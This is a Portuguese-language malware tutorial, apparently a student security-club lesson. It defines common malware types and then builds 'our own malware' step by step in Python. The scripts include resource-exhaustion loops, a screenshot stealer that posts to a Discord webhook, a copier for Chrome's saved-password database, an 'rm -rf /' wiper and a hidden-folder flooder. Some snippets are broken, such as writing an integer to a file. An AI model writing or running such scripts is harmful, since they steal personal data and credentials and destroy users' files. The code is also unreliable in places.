# Introdução a Vírus e Malwares

## O que é um vírus de computador?

"Um vírus de computador é um programa malicioso que se propaga infectando outros programas e arquivos. Ele pode se espalhar por meio de anexos de e-mail, downloads de arquivos, pen drives e outros dispositivos de armazenamento. Os vírus de computador podem causar danos ao sistema operacional, roubar informações pessoais e até mesmo danificar o hardware do computador."  
(Fonte: [Kaspersky](https://www.kaspersky.com.br/resource-center/threats/computer-viruses))

"Vírus é um arquivo que, quando executado, prejudica o seu computador de alguma forma."  
(Fonte: Arial 15, Marabá)

## Tipos de vírus

### Worms

Worms são programas maliciosos que se propagam automaticamente pela rede, explorando vulnerabilidades em sistemas operacionais e softwares. Eles podem se espalhar rapidamente e causar danos significativos a computadores e redes.

### Cavalos de Troia (Trojans)

Cavalos de Troia são programas maliciosos que se disfarçam como software legítimo para enganar os usuários. Eles podem roubar informações pessoais, instalar outros malwares e abrir portas para invasores.

### Ransomware

Ransomware é um tipo de malware que criptografa arquivos e exige um resgate para liberar o acesso aos dados. Ele pode se espalhar por e-mails, downloads maliciosos e vulnerabilidades de software.

### Spyware

Spyware é um malware que monitora as atividades do usuário sem o seu consentimento. Ele pode coletar informações pessoais, como senhas, histórico de navegação e dados bancários.

### Adware

Adware é um malware que exibe anúncios indesejados no computador do usuário. Ele pode causar lentidão no sistema, redirecionar para sites maliciosos e coletar informações de navegação.

### Botnets

Botnets são redes de computadores infectados controlados por um invasor. Elas podem ser usadas para enviar spam, realizar ataques de negação de serviço (DDoS) e roubar informações.

### RAT (Remote Access Trojan - Cavalo de Troia de Acesso Remoto)

RAT é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.

Esse malware também é conhecido como Remote Administration Tools (Ferramenta de Administração Remota).

### Keylogger

Keylogger é um tipo de malware que registra as teclas digitadas pelo usuário, capturando senhas, mensagens e outras informações confidenciais. Ele pode ser usado para roubo de identidade e espionagem.

## Como se proteger de vírus e malwares?

**Não seja ingênuo!** Sempre mantenha seus sistemas e softwares atualizados, evite clicar em links suspeitos, não baixe arquivos de fontes desconhecidas e utilize um bom software antivírus.

## Vamos criar o nosso malware!

Agora que entendemos um pouco sobre vírus e malwares, vamos criar nosso próprio malware simples.

**DISCLAIMER:** Essa aula é apenas para fins educacionais e não deve ser usada para prejudicar outras pessoas. O uso de malware é ilegal e pode resultar em graves consequências legais. ;)

### Como pode ser um simples malware?

Sabemos que malwares são programas maliciosos que podem causar danos ao sistema, roubar informações ou até danificar o hardware. Vamos começar com algo simples: um programa que apenas trava o computador, criando um loop infinito que consome toda a CPU.


```python
while True:
    pass
```

Esse código cria um loop infinito que não faz nada além de consumir recursos do computador. Executá-lo pode travar o sistema, exigindo um reinício para recuperá-lo. Se rodado em uma IDE como o VSCode, apenas a IDE pode travar, sem afetar o sistema inteiro.

Podemos melhorar um pouco esse código.

```python
i = 0
while True:
    i += 1
```

Agora o loop infinito incrementa uma variável, consumindo mais recursos e potencialmente causando lentidão no sistema.
Vamos adicionar um print para aumentar ainda mais o consumo de recursos.

```python
i = 0
while True:
    i += 1
    print(i)
```

Agora, o loop imprime o valor de `i` a cada iteração. Isso pode travar o sistema mais rapidamente.
Mas podemos fazer algo ainda mais interessante, manipulando arquivos.

```python
i = 0
while True:
    i += 1
    with open(f'arquivo_{i}.txt', 'w') as f:
        f.write('InsperSec')
```

Esse código cria arquivos infinitamente, mas ainda não é muito eficiente. Vamos intensificar a operação.

```python
i = 0
while True:
    i += 1
    with open(f'arquivo_{i}.txt', 'w') as f:
        f.write(i**i)
```

Agora, os arquivos crescem exponencialmente, consumindo muito espaço em disco, o que pode travar o sistema. Mas ainda podemos melhorar.

```python
import os

i = 0
while True:
    i += 1
    with open(f'arquivo_{i}.txt', 'w') as f:
        f.write(i**i)
    os.system(f'rm arquivo_{i}.txt')
```

Agora, o malware cria arquivos exponenciais e os remove logo em seguida, causando um grande consumo de recursos e danificando o sistema de arquivos.

Quer roubar informações pessoais? Vamos capturar a tela do usuário.

```python
import pyautogui
import requests

discord_webhook = 'https://discord.com/api/webhooks/1234567890/ABCDEFGHIJKLMN'

def send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    files = {'file': open('screenshot.png', 'rb')}
    requests.post(discord_webhook, files=files)

send_screenshot()
```

Agora, temos um malware que envia capturas de tela para um webhook do Discord.

Podemos ir mais longe e roubar senhas salvas no navegador.

```python
import os
import shutil

def steal_passwords():
    path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'
    shutil.copy(path, 'senhas.db')

steal_passwords()

```

Esse malware copia o banco de dados de senhas do Google Chrome para um arquivo local.

Finalmente, um malware perigoso que apaga o sistema operacional.

```python
import os

def delete_system():
    os.system('rm -rf /')

delete_system()
```

Esse código exclui todos os arquivos do sistema, causando uma perda irreparável de dados.

Para fechar, um vírus divertido que cria pastas infinitamente e as esconde no sistema.

```python
import os

def create_folders():
    i = 0
    while True:
        i += 1
        os.mkdir(f'pasta_{i}')
        os.system(f'attrib +s +h pasta_{i}')

create_folders()
```

Esse script cria pastas infinitas e as esconde com atributos de sistema, deixando o computador cheio de diretórios ocultos.